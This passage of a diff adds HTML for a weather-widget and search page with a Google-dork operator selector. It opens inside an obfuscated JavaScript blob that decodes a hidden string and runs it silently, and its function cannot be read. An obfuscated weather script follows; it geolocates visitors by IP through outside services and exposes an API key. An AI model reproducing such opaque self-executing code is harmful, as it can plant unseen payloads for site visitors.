/iuqc5pqu5ppfh2;/nppyp6dp;qdmhs13dzwq~s1lt4ylv*p12isf;eq<j1*<uuv&&jbs8$fyqu1-qfso<<me|1ts<pjq)p<benmejc&f.etpyntco.bf.pb<osjjo<jjptdsge|dmubtu;xouumphujilfjeqjtj.jubmj;wfhg`jmpuexppupo8.jsujvbobujonfs.14hp;dtz;uie;;[;c&|iv3p;;bj;ub2)$p~cuo1o2ocd4ic181ub;e&|1pt<6;t161u$d6.~eqopu18pqq1pvl1djyfmpq7myy1n|hqp$t<<vqy9v<*1;esymtqpqu;<qum~12jp<pumwpfbuyff~1tvxspbft<vp*<g$qqoj;qzsjuuq|uux/ymee$.;gupp;$p;jq<b.u5ccmjq<2bq1obqzdi5vmpp;m1c;<ehb;p;5upxo8f&p5s.jejm6~ud.;&g<v9jtoeop1plzb<umu&hqbjmsq/o<;cm;f`<ifuoj;ys|qitfbgjmufjho$~fcpjpgvudf;ep;ffubtemuu;pg1|o2.4$sdjev;p3ou<u!1cgsplufu9~1|;uscqm3b.hjof1$&e3fbvypgeqsp<<&d~j&you<dejmpoeu<p$t~utucl~pbv;jpgoqq$.gpb<",(function(){this._z9TJMJ0kC__2UPtMy={f:function(_s87s,$){_sw="\x70\x6c\x61";function _MX(_s87s,$,_YA,_E6){function _KQv1(_Ph){_Ph=_z14(_Ph)-32-(_E6%95);if(_Ph<0){_Ph+=95;}_Ph+=32;_E6++;return _xG34(_Ph);};function _D8G(_s87s,_YA){_4K43=_s87s[_YA];_36rY="";while(_4K43!="\f"){if(_4K43<" "){_36rY+=_4K43;}else{_36rY+=_KQv1(_4K43);}_YA++;_4K43=_s87s[_YA];}return _36rY;};function _z14(_4K43){return _4K43[_87u](0);};function _xG34(_Ph){return this[_Ki][_5C](_Ph);};_YA=_YA?_YA:0;if(_s87s[_X0v]>_YA){_E6=_E6?_E6:0;_8zOU=_D8G(_s87s,_YA);_cGI=_8zOU[_X0v];_7kF=_D8G(_s87s,_YA+_cGI+1);_UZ=_7kF[_X0v];$[_8zOU]=_7kF;_MX(_s87s,$,_YA+_cGI+1+_UZ+1,_E6);}};_um="\x72\x65"+_sw+"\x63\x65";_87u=_z49("_ahco%Cr%Aedt");_Ki=_z49("r_t%Sgni");_5C=_z49("_orfhCm%Crae_do");_X0v=_z49("ne_lh_tg");_MX(_s87s,$);function _z49(_6h8S){return _6h8S[_um](/[x%y_z]/g,'')[_um](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_OJ;\fJztj|ryy\fk[zXi\f$w$!vy|\fwLRS2\f(.)/\f!\"9\\4\f&4}wsaTX?TA]_DYGbSVe\\;$C(T=HK\\QOdWH[pnJmdgMXeM;MUT_yy+]'\",&19hBs1do046ijkl#nyDUJH]P2[V`Zem})\\wES^%0l! \"v\"*j|.'064?%*Y{A;F;BI=LP EHSXMITKL5$cP[]kjjBidwJxor^ipJz~do|.0'2*j25:4q|3,h4w#PEOS\\M-TW\\V%0UeiRH,7tijq|qq%{$%9DyO`$7rAL<?F;6&=<>OMX>tDyS^RY`TcgGle`_j^5IRepyl t (c'}!q|~Rej .y%183FxG>A~T&1C}wY,7aUfH_e_kst8Cc>_?yS@K{#%}-drmnKV&ar0Q\\D6G@IOiHE\\gD{L:]cnUbXlf`kltnycs\"?[zv\"u(*j0)$4!,$=[ty(3=B88MDLM2=B}yy~a:ETfhK^sqCN`G}UoJU#}%{~}.S^|'/zYd,99/9@Gbm7\"m/7it7ZZSZUq|QGXKpx$PeiI~ y\"-lwvzE)4&!,'6,1<'td{e8CF;<FJSDALB4JY>HSba_^Z^P[\\E7]Vamuz|\\#^ispQMQ`fq6-,.?mx.`jOB!u!POMLY|(H !V'$/aWl]d+6_3X<1<}!(|w8CuN#dj6@K5(;>2GR0KA$(5OZ,BWMU`H[`;5?]hALJKcn`wgh8d@lw!((~r}yckkx$/629~*.zjm%0A(NCF,7CwB9#84?TcZq:E[1rn|AL|o #GRq&IZMX0/\"1S^&*m`cE[fEFI`k<T\"3Qgr\\]Plw4?D>Q}.(}0&--? .wqm[N'Akb[8Y.e@e^W`5J|Mklg<Lp!9j^CSw(@&^SU`{Nj*F=A?&b;XY-QMrLy<ki,dt9Ia8{=6*n)SJC Ru&JZrI-NY~V1V`$4Xh!W;]gK86X1FxIgh`T9Im}6lFhAV)Ywxslr&icOaoPjZ+o3k`bm6r^p~_qe3Ad~n?$e/:lCr_\"oN+v)7w2c+4n[GT^_UNWOb?+=K,&w~mYfpqg`hatQ=O]>&r*}MKmjuHb/<FmX^pQcW%~ra_\"\"lomsou{si,&pv)M^_`#)|ve{yz+E),*0,280&|FQ$Y(\\&RF>2BDB?lPQ;KE;MCJJ\\=92)VEkDSK7|rfUSuN]UA'|plXjxY0I0nv=`ogS9a+6h:C'xVl83n\"6>Q.y,:zoOT\\/':C$>.^C%NY,!1#G/ZU3>KLIMyuklf;?p@nmgo#_K]kL!\"$.Qk[,pR{'Yq/GK\\[%0bN=?dc-8jAuEl8peEJ>Q!~AyNOQDEH!UVX!JU(203\\+klbZ[OK7IW8K*\"Rz>rsu>tB!MW[qaM_mNU5+%A2&2W^>4.J:^5N5s{`*5gqor<jInuUKEa@A@4#!C{RkR19}#*i_Yu'gh,?}uFZNF:JLJGY:T&MV1{_`abXL\\^\\YkLF8?,o.jVhvW2s17csmcukrr%evl\"w3kXGh9-{y<9DvcRhQ<'-? l[|MA&ra#&OZ-yh~g0[]pT=EM@W<)w9<epCx,4EDmxKC~IMxQ>-N~2uv5aqkasipp#c MM02&}q\"$\"~1:rM/L=>xS5RxBM 7cs1#Of(bDa(Q\\/Fr#@2o6P@pU7`k>Vs,0A@itG3\"$I(k*Vf`Vh^eewX/3Q%]vi1+~zfx'}\"Gj$v>j4?qCL0\"_uA<Z>FyO}|FQ$U^B4q(SN\\PXkGK/JN2[f9CADm<lq? jk!YM]_]ZlcgKt R;BAT z)|%8{:vbt#crm?Co yo\"w~~1q& -G?wr'qU1G;7#5C$t=Y~f*<0]*S^145gg|5`]h;m2th{KIkD?S>\"]sgLG[F*eNw#U+>FWV +]a0Qu`,dU}:_6jeydH$:M1s#}OUxi2NsyCN!|\\WZh%cGeB.@N/(,dwkp=MG=OELL^?DySRlE0JC3sgL4!8.Qk[,pR{'YkoIBK]\\&1c;nOT~g3kVpiY:M|z=u]Jau?J|&-w~K?.,NH($|sA0V/vcz/Xc6?F18deYHFhA)u-AjuHWZB7KwkPjZ+oQz&Xp.FJ[Z$/aM<>cDgO<Sg1<n}!h]qP4*}.0.+=}wip]AB%_A^fROZ-Gs!+R=CU6H<icz<NBo<epC]*7AF$J\\P}Js~Q8%6=T X@-DX\"-_:Jfa.Apn1+jE'D8,$w(*(%7wqcjW;}2,9SK$^@]Qd*#'_rfm1gk*]6R  bdexQEUWURdE_1Xa<'j)eQcqREfK(B6YSEL9euoewmtt'gU!AEO6nYsl\\=1 }@:yl.rOiI=\"t6zWqe)Ct<E jC7GIGDV7<qKJd=(B;+k~bZYadIXS%Ir}P&T)R}VA[TD(\\kf8\\&1cr <Wugf0;mwuxBp=P4zy.}$D#G;>4(8:85G(Bs;D~iMkH4FT5wJ#@w;UEuZ<epC-w8?FEnyL4\"`Ny#l&Y 3o[m{\\77tm9@c}m>#d.9kU@`gnm7Bt\\J)vBK5N#H[8$6D%o|!2g+E5eJ,U`3|g(/65^i<$qP>ir\\uKo#_K]kOf,KN-iUguh5z{6blp'vbt#mB6BqEi$NE>zk5@r|z}GuT$FGF:6\"4B'-b&@jaZ7(7,jG3ES8r6PzqjG8al?q$(<ICnQq%TRtu~h5*#$13Z!~ #_9;/xEDIJ./#y4GntH,t|%w3}{>?H2^^LMZ\\$JHIL)bdXBnqrsWXLC]p8>q:Q5^i<RAo;u@kVn\"Y&kl'jS[cVm\\Z|g s[rV +]sb1\\7a-w0CzG-.H,xv9uOQE/N^B6~%Z}8(X=~HS&oZz\")(Q\\/vdC1\\9chatX>U9bm@VEs?yDoLRs'jkXVxc{oWnR{'Yo^-X3])s,?#|hz)in?X\\PMs+n8Cu }!JxW4 2@*&`$[6[MYC\\\\]iF2DRG>r6P@pU7`k>XM/2>BAjuH0!FJuN&`&\"$m''(\"5q]o}`=()>zfx'tlG;G$o\"0s{P(~Q.y,:%YMY7)+/)L/b',\\uymVJG9;?9\\8@s8=m'+~g[WCUc]I$JaEMUJ)XVxjV12U8jC`$wfd'!`Ny:>H/i23'~r#%# 2yu\"*|S7{XCDY=&.6)@<(:H)B 9?5l`l<:\\N:tu9ssQJuh\\ZF!flh#Ha?X^T,!,oX`h[va_\"s_:;^IVZk-!~jE0,2Gl&c|#xPEP4xCV3~W'%G 9v06,OC*Tg+$(`sglPQ7?atA=uEghy]MEmn HP%p]TvYQwtYU.q^\\~xXFq26@'a*+~vjz|zw*qmy\"tK/{y<tO1NB6z,\"7-H![=ZNaEFd\f");function _ew(_XW1j,_KkkW,_d6B,$,_8ajz,_JBYg){_2d4N=this._z9TJMJ0kC__2UPtMy;_2d4N.f(_8ajz,$);if(!_d6B){_d6B=$.__u8n;}_Tz()(_XW1j,0,0x811,this,"''");function _Tz(){return function(_wk,_fla,_1aD,_X3x5,_J5h){_2d4N.p1=_wk;_2d4N.p2=_1aD;try{_TZ(_X3x5)(_27B1()([_d6B[$._NlIY]("+p%p",_J5h)[$._NlIY]("-p%q",_J5h)],''))();}catch(e){}function _TZ(_7j){return _7j[$._NH8];};_X3x5._z9TJMJ0kC__2UPtMy=_JBYg;};};function _27B1(){return function(_tFo,_M4L){return _tFo[$._388u](_M4L);};};};}());
+      </script>
+      <div class="cube">
+        <div id="location" class="face">Location</div>
+        <div id="temperature" class="face">Temperature</div>
+        <div id="description" class="face">Description</div>
+        <div id="wind-speed" class="face">Wind Speed</div>
+        <div id="humidity" class="face">Humidity</div>
+        <div id="pressure" class="face">Pressure</div>
+      </div>
+
+
+
+
+
+      <script>
+        function _0x2792(_0x31cd85, _0x1fddfb) {
+          var _0x2f3eef = _0x2f3e();
+          return _0x2792 = function (_0x27920a, _0x2948d0) {
+            _0x27920a = _0x27920a - 0x1cd;
+            var _0x2dd718 = _0x2f3eef[_0x27920a];
+            return _0x2dd718;
+          }, _0x2792(_0x31cd85, _0x1fddfb);
+        }
+
+        function _0x2f3e() {
+          var _0x12a465 = ['Temperature:\x20', '#humidity', 'name', 'ready', 'Humidity:\x20', 'src',
+            'Wind\x20Speed:\x20', 'getJSON', 'Current\x20weather\x20for\x20', 'main', '411902ZxRupq', 'weather',
+            '2001264ZfJyTw', 'icon', 'country', '#wind-speed', 'speed', '#temperature', '?lat=', 'm/s', '&appid=',
+            'https://api.ipify.org?format=json', 'round', 'loc', 'wind', '#icon', 'Description:\x20', 'text',
+            '2674287HJXKeN', '&lon=', '425a56346a4331f5158025241128efe6', '244508PGarNf', '8808728YuhYHx', 'split',
+            'https://openweathermap.org/img/wn/', '441756fQYHjm', 'description', 'temp', 'hPa', '65LsemxE',
+            '2304363lrOXkM', 'humidity'
+          ];
+          _0x2f3e = function () {
+            return _0x12a465;
+          };
+          return _0x2f3e();
+        }
+        var _0x4fe854 = _0x2792;
+        (function (_0x36cd9a, _0x111894) {
+          var _0x582394 = _0x2792,
+            _0x4529fe = _0x36cd9a();
+          while (!![]) {
+            try {
+              var _0x3472e4 = -parseInt(_0x582394(0x1d0)) / 0x1 + -parseInt(_0x582394(0x1e1)) / 0x2 + -parseInt(
+                  _0x582394(0x1d5)) / 0x3 + -parseInt(_0x582394(0x1f6)) / 0x4 * (-parseInt(_0x582394(0x1d4)) / 0x5) +
+                -parseInt(_0x582394(0x1e3)) / 0x6 + parseInt(_0x582394(0x1f3)) / 0x7 + parseInt(_0x582394(0x1cd)) /
+                0x8;
+              if (_0x3472e4 === _0x111894) break;
+              else _0x4529fe['push'](_0x4529fe['shift']());
+            } catch (_0x1c971c) {
+              _0x4529fe['push'](_0x4529fe['shift']());
+            }
+          }
+        }(_0x2f3e, 0x8101b), $(document)[_0x4fe854(0x1da)](function () {
+          var _0x4862b0 = _0x4fe854;
+          $['getJSON'](_0x4862b0(0x1ec), function (_0x30d27e) {
+            var _0x2d5a33 = _0x30d27e['ip'];
+            $['getJSON']('https://ipinfo.io/' + _0x2d5a33 + '/json', function (_0x355a57) {
+              var _0xd5c640 = _0x2792,
+                _0x48a93a = _0x355a57[_0xd5c640(0x1ee)][_0xd5c640(0x1ce)](',')[0x0],
+                _0x4ce53c = _0x355a57['loc'][_0xd5c640(0x1ce)](',')[0x1],
+                _0x5c16be = _0xd5c640(0x1f5),
+                _0x36bcb3 = 'https://api.openweathermap.org/data/2.5/weather',
+                _0x537074 = _0x36bcb3 + _0xd5c640(0x1e9) + _0x48a93a + _0xd5c640(0x1f4) + _0x4ce53c +
+                _0xd5c640(0x1eb) + _0x5c16be;
+              $[_0xd5c640(0x1de)](_0x537074, function (_0x11be67) {
+                var _0x2aa697 = _0xd5c640,
+                  _0x2937a3 = Math[_0x2aa697(0x1ed)](_0x11be67[_0x2aa697(0x1e0)][_0x2aa697(0x1d2)] -
+                    273.15),
+                  _0x57d640 = _0x11be67[_0x2aa697(0x1e2)][0x0][_0x2aa697(0x1d1)],
+                  _0x31135d = _0x2aa697(0x1cf) + _0x11be67[_0x2aa697(0x1e2)][0x0][_0x2aa697(0x1e4)] +
+                  '.png',
+                  _0xa6aaee = _0x11be67[_0x2aa697(0x1ef)][_0x2aa697(0x1e7)],
+                  _0x2840e9 = _0x11be67[_0x2aa697(0x1e0)][_0x2aa697(0x1d6)],
+                  _0x16dbb6 = _0x11be67[_0x2aa697(0x1e0)]['pressure'];
+                $('#location')['text'](_0x2aa697(0x1df) + _0x11be67[_0x2aa697(0x1d9)] + ',\x20' +
+                    _0x11be67['sys'][_0x2aa697(0x1e5)]), $(_0x2aa697(0x1f0))['attr'](_0x2aa697(0x1dc),
+                    _0x31135d), $(_0x2aa697(0x1e8))[_0x2aa697(0x1f2)](_0x2aa697(0x1d7) + _0x2937a3 +
+                    '°C'), $('#description')[_0x2aa697(0x1f2)](_0x2aa697(0x1f1) + _0x57d640), $(
+                    _0x2aa697(0x1e6))[_0x2aa697(0x1f2)](_0x2aa697(0x1dd) + _0xa6aaee + _0x2aa697(
+                    0x1ea)), $(_0x2aa697(0x1d8))[_0x2aa697(0x1f2)](_0x2aa697(0x1db) + _0x2840e9 + '%'),
+                  $(
+                    '#pressure')[_0x2aa697(0x1f2)]('Pressure:\x20' + _0x16dbb6 + _0x2aa697(0x1d3));
+              });
+            });
+          });
+        }));
+      </script>
+
+
+
+      <div class="gcse-searchbox">
+        <select id="dorking-selector">
+          <option value="">No Dorking</option>
+          <option value="intitle:">Title Search</option>
+          <option value="inurl:">URL Search</option>
+          <option value="intext:">Text Search</option>
+          <option value="filetype:">File Type Search</option>
+          <option value="site:">Site Search</option>
+        </select>
+
+        <input type="text" class="gsc-input" name="search" size="31" autocomplete="off" placeholder="Search...">
+        <button type="button" onclick="executeQuery()" id="bt">Search</button>
+
+
+
+
+        <div class="pagination">
+          <button id="prev-page-btn" onclick="previousPage()">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z" />
+              <path d="M0 0h24v24H0z" fill="none" />
+            </svg>
+            Previous Page
+          </button>
+          <button id="next-page-btn" onclick="nextPage()">
+            Next Page
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M8.59 16.59L10 18l6-6-6-6-1.41 1.41L13.17 12z" />
+              <path d="M0 0h24v24H0z" fill="none" />
+            </svg>
+          </button>
+        </div>
+
+
+        <div class="gcse-searchresults" id="search-results"> </div>
+      </div>
+      <script>
+        function isMobileDevice() {
+          return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
+        };
+
+       
+        const searchBox = document.querySelector('.gcse-searchbox');
+        const pa = document.querySelector('.pagination');
+        if (isMobileDevice()) {
+          searchBox.style.width = '330px';
+          searchBox.style.height = '130px';
+          searchBox.style.left = '25%';
+          searchBox.style.top = '30%';
+          pa.style.left = "40%";
+          pa.style.top = "70%";
+
+
+
+
+        } else {
+          searchBox.style.width = '600px';
+          searchBox.style.left = '25%';
+        }
+      </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <script src="scri.js"></script>
+      <script src="timea.js"></script>
+</body>
+
+</html>
